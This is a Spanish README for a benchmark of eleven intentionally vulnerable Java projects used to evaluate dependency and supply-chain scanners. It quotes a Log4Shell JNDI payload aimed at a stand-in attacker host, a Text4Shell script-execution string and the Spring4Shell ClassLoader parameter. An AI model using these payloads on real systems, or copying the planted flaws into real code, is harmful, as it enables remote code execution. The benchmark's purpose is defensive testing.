# DevSecOps Demo Projects

Proyectos sinteticos de ejemplo con vulnerabilidades reales para pruebas de analisis de seguridad en cadenas de suministro de software (Supply Chain Security).

Cada proyecto simula un escenario real de riesgo encontrado en aplicaciones Java/Kotlin empresariales. Incluyen dependencias con CVEs conocidos, codigo vulnerable, y vectores de ataque documentados.

## Proyectos

### 01 — Log4Shell RCE `01_log4shell_rce/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Facil |
| **CVEs directos (OSV)** | 3 |
| **Dependencias** | log4j-core 2.14.1, log4j-api 2.14.1 |
| **Vector de ataque** | JNDI lookup injection via log messages — `${jndi:ldap://attacker/exploit}` |

El clasico Log4Shell (CVE-2021-44228, CVSS 10.0, KEV activo). `App.java` usa `logger.info()` con input del usuario sin sanitizar. Un atacante envia `${jndi:ldap://attacker.com/exploit}` y Log4j resuelve el JNDI lookup ejecutando codigo remoto.

---

### 02 — Struts2 OGNL Injection `02_struts2_ognl/`

| | |
|---|---|
| **Ecosistema** | Maven (WAR) |
| **Dificultad** | Facil |
| **CVEs directos (OSV)** | 10 |
| **Dependencias** | struts2-core 2.5.25, struts2-convention-plugin 2.5.25 |
| **Vector de ataque** | OGNL expression injection via parametros HTTP + file upload path traversal |

`App.java` extiende `ActionSupport` de Struts2 que evalua expresiones OGNL en parametros HTTP. CVE-2023-50164 permite path traversal via file upload. El mismo tipo de vulnerabilidad que causo la brecha de Equifax.

---

### 03 — Jackson Gadget Chain `03_jackson_gadget_chain/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Media |
| **CVEs directos (OSV)** | 58 |
| **Dependencias** | jackson-databind 2.9.8, commons-collections 3.2.1, commons-beanutils 1.9.3 |
| **Vector de ataque** | Polymorphic deserialization + InvokerTransformer gadget chain |

La combinacion mas peligrosa de deserializacion Java. `App.java` usa `ObjectMapper.enableDefaultTyping()` que permite instanciar clases arbitrarias via JSON. Commons Collections 3.2.1 provee el gadget chain (`InvokerTransformer`) que permite ejecutar comandos del sistema.

---

### 04 — Spring4Shell RCE `04_spring4shell_rce/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Facil |
| **CVEs directos (OSV)** | 5 |
| **Dependencias** | spring-webmvc 5.3.17, spring-beans 5.3.17 |
| **Vector de ataque** | HTTP parameter injection modifica ClassLoader para escribir webshell JSP |

`App.java` es un `@Controller` con Spring data binding que procesa parametros HTTP sin restriccion. CVE-2022-22965 (KEV activo) permite a un atacante modificar propiedades del ClassLoader via parametros como `class.module.classLoader.resources.context.parent.pipeline.first.pattern`.

---

### 05 — Hidden in Transitives `05_hidden_in_transitives/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Dificil |
| **CVEs directos (OSV)** | 0 |
| **Dependencias** | cxf-rt-frontend-jaxrs 3.4.5, spring-boot-starter-web 2.6.6 |
| **Vector de ataque** | CVEs ocultos en arbol de dependencias profundo N2/N3 |

Las dependencias directas no tienen CVEs en OSV. Sin embargo, sus transitivas profundas incluyen snakeyaml 1.29 (RCE), jackson-databind antiguo, tomcat-embed vulnerable, y woodstox-core con XXE. `App.java` no importa ninguna clase vulnerable directamente — la amenaza esta completamente oculta en el arbol de transitivas.

---

### 06 — Typosquatting Trap `06_typosquatting_trap/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Media |
| **CVEs directos (OSV)** | 9 |
| **Dependencias** | bcprov-jdk15on 1.60, commons-text 1.9, guava 29.0-jre |
| **Vector de ataque** | StringSubstitutor expression injection + paquete cripto abandonado + info disclosure |

`App.java` usa `StringSubstitutor.createInterpolator()` de Commons Text 1.9 (Text4Shell, CVE-2022-42889) que evalua expresiones peligrosas como `${script:javascript:Runtime.exec()}`. Tambien usa Bouncy Castle `bcprov-jdk15on` (rama descontinuada, reemplazada por `bcprov-jdk18on`) con MD5 (crypto debil). Guava 29 tiene info disclosure en temp directories.

---

### 07 — Hardcoded Secrets `07_hardcoded_secrets/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Media |
| **CVEs directos (OSV)** | 11 |
| **Dependencias** | hibernate-validator 6.0.18, snakeyaml 1.30, gson 2.8.6 |
| **Vector de ataque** | Secrets en codigo fuente + YAML constructor injection + DoS via JSON |

`App.java` tiene hardcodeados: AWS Access Key, AWS Secret Key, GitHub token, Slack webhook, credenciales de base de datos (usuario/password), y JWT secret. Ademas usa `new Yaml().load()` con input no confiable (CVE-2022-1471 — RCE via constructor injection) y Gson 2.8.6 vulnerable a DoS.

---

### 08 — Supply Chain Injection `08_supply_chain_injection/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Media |
| **CVEs directos (OSV)** | 28 |
| **Dependencias** | netty-codec-http 4.1.42, commons-io 2.6, xstream 1.4.17 |
| **Vector de ataque** | Deserializacion XML sin restricciones + HTTP smuggling + path traversal |

`App.java` usa XStream 1.4.17 sin security framework configurado — `xstream.fromXML()` con input no confiable permite instanciar clases arbitrarias (15+ CVEs de deserializacion: CVE-2021-39139 a CVE-2021-39154). Tambien usa `FileUtils.readFileToString()` con nombre de archivo controlado por el usuario (path traversal). Netty 4.1.42 permite HTTP request smuggling para bypass de WAF/proxy.

---

### 09 — Crypto Weak (Gradle) `09_crypto_weak_gradle/`

| | |
|---|---|
| **Ecosistema** | Gradle |
| **Dificultad** | Dificil |
| **CVEs directos (OSV)** | Pendiente |
| **Dependencias** | bcprov-jdk15on 1.60, xmlsec 2.3.0, spring-ldap-core 2.3.4, logback-classic 1.2.9 |
| **Vector de ataque** | DES/ECB crypto debil + XXE en XML Signature + Logback JNDI + LDAP injection |

Proyecto **Gradle** (no Maven) para verificar soporte multi-ecosistema. `App.java` usa cifrado DES con modo ECB (criptografia rota — DES tiene 56 bits, ECB no provee confidencialidad para bloques repetidos) con clave hardcodeada. Dependencias incluyen Apache Santuario xmlsec 2.3.0 con XXE, Logback 1.2.9 con JNDI injection similar a Log4Shell (CVE-2021-42550), y Spring LDAP vulnerable a LDAP injection.

---

### 10 — Multi-Vector Stress Test `10_multi_vector_stress/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Stress |
| **CVEs directos (OSV)** | 88 |
| **Dependencias** | log4j-core 2.14.1, struts2-core 2.5.25, jackson-databind 2.9.8, commons-collections 3.2.1, commons-text 1.9, spring-beans 5.3.17, netty-codec-http 4.1.42, snakeyaml 1.30 |
| **Vector de ataque** | TODOS los vectores combinados simultaneamente |

`App.java` importa y usa TODAS las dependencias vulnerables en un solo archivo: `LogManager.getLogger()`, `ObjectMapper.enableDefaultTyping()`, `StringSubstitutor.createInterpolator()`, `new Yaml().load()`, y `CollectionUtils`. 8 dependencias vulnerables activas, 88 CVEs directos, multiples KEV, multiples exploits publicos. Maximo nivel de stress para cualquier herramienta SCA.

---

### 11 — Supply Chain PoC `11_supply-chain-poc/`

| | |
|---|---|
| **Ecosistema** | Maven |
| **Dificultad** | Media |
| **CVEs directos (OSV)** | ~24 |
| **Dependencias** | log4j-core 2.14.1, commons-text 1.9, commons-collections 3.2.1, struts2-core 2.5.25, bcprov-jdk15on 1.60 |
| **Vector de ataque** | Combinacion realista de Log4Shell + Text4Shell + gadget chain + OGNL + crypto debil |

Proyecto PoC (Proof of Concept) completo con estructura Maven estandar, configuracion VS Code, y clase `App.java` que usa `@SpringBootApplication` con Log4j y Commons Collections. Simula una aplicacion empresarial real que combina 5 dependencias con diferentes niveles de riesgo: desde CVSS 10.0 (Log4Shell) hasta crypto descontinuada (Bouncy Castle jdk15on).

---

## Estructura de cada proyecto

```
proyecto/
├── pom.xml (o build.gradle)      Manifiesto con dependencias vulnerables
├── expected.json                  Ground truth: CVEs esperados (fuente: OSV API)
└── src/
    └── main/
        └── java/
            └── com/
                └── example/
                    └── App.java   Codigo Java que USA las dependencias vulnerables
```

## Vectores de ataque cubiertos

| Vector | Proyectos | CVEs representativos |
|--------|-----------|---------------------|
| RCE (Remote Code Execution) | 01, 02, 04, 08, 10, 11 | CVE-2021-44228, CVE-2022-22965, CVE-2021-31805 |
| Deserializacion insegura | 03, 08, 10 | CVE-2019-12384, CVE-2021-39144 |
| Inyeccion de expresiones | 02, 06, 10, 11 | CVE-2022-42889, CVE-2020-17530 |
| HTTP smuggling | 08, 10 | CVE-2019-20444, CVE-2021-43797 |
| Path traversal | 02, 08 | CVE-2023-50164, CVE-2021-29425 |
| XXE (XML External Entity) | 09 | CVE-2023-44483 |
| JNDI injection | 01, 09, 10, 11 | CVE-2021-44228, CVE-2021-42550 |
| LDAP injection | 09 | Spring LDAP |
| Criptografia debil | 06, 09 | DES/ECB, MD5, Bouncy Castle descontinuado |
| Secrets hardcodeados | 07 | AWS keys, DB creds, JWT, GitHub tokens |
| Dependencias abandonadas | 06, 09, 11 | bcprov-jdk15on (reemplazado por jdk18on) |
| CVEs en transitivas profundas | 05 | snakeyaml, jackson, tomcat en N2/N3 |
| Gadget chain | 03, 10 | Commons Collections InvokerTransformer |

## Resumen de CVEs por proyecto

| Proyecto | CVEs (OSV ground truth) | KEV | Exploits |
|----------|:-----------------------:|:---:|:--------:|
| 01_log4shell_rce | 3 | Si | Si |
| 02_struts2_ognl | 10 | Si | Si |
| 03_jackson_gadget_chain | 58 | No | Si |
| 04_spring4shell_rce | 5 | Si | Si |
| 05_hidden_in_transitives | 0 (en transitivas) | No | Posible |
| 06_typosquatting_trap | 9 | No | Si |
| 07_hardcoded_secrets | 11 | No | Si |
| 08_supply_chain_injection | 28 | No | Si |
| 09_crypto_weak_gradle | Pendiente | No | No |
| 10_multi_vector_stress | 88 | Si | Si |
| 11_supply-chain-poc | ~24 | Si | Si |

## Ground truth

Cada `expected.json` contiene los CVEs verificados de forma independiente consultando la [OSV API](https://osv.dev/) directamente, sin usar ninguna herramienta de escaneo. Esto garantiza que el benchmark es independiente y no esta sesgado.

## Uso

Estos proyectos estan disenados para evaluar herramientas de:

- **SCA (Software Composition Analysis):** Snyk, OWASP Dependency-Check, Trivy, Grype
- **Supply Chain Security:** Pipelines agenticos, analisis de confianza, deteccion de typosquatting
- **SBOM Generation:** CycloneDX, SPDX
- **Vulnerability Management:** Priorizacion por severidad, cadenas de ataque, reachability

```bash
# Escanear un proyecto individual
python run_pipeline.py --manifest-path benchmark/proyectos_de_prueba/01_log4shell_rce/pom.xml

# Correr benchmark completo (10 proyectos)
python benchmark/benchmark.py

# Regenerar ground truth desde OSV
python benchmark/generate_ground_truth.py
```

## Notas

- Los proyectos **NO estan disenados para compilar ni ejecutar** — son manifiestos con dependencias vulnerables y codigo de ejemplo que ilustra el uso real
- Las versiones de las dependencias son **intencionalmente antiguas** para contener CVEs conocidos
- El proyecto `09_crypto_weak_gradle` usa Gradle para verificar soporte multi-ecosistema
- El proyecto `05_hidden_in_transitives` tiene 0 CVEs directos pero multiples CVEs en transitivas — es el test mas dificil
- El proyecto `11_supply-chain-poc` incluye configuracion VS Code y artefactos compilados (`.class`)
